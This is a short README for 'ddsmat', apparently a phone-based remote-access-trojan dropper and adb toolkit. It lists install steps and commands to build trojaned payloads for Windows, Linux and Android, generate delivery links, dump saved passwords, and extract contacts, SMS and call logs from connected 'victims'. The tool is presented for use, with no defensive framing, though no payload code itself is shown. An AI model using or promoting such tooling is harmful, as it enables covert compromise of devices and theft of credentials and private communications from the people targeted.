# ddsmat

Termux-native RAT dropper + adb toolkit. Runs entirely on your phone.

## install

```bash
pkg install -y python git android-tools termux-api
pip install -r requirements.txt
cp config.example.json config.json
python ddsmat.py
```

For `.exe` payloads: `pip install pyinstaller`
For `.apk` payloads: `pkg install metasploit`

## commands

```
/image [path] [name] [target]   build ratted payload (windows | linux | android)
/link  [file]                   get link for a file
/steal [serial]                 dump saved passwords (adb)
/phone <serial> [what]          contacts | sms | calls | all
/victims                        list adb devices
/ls                             list builds
/open <name>                    path to a build
/help /exit
```
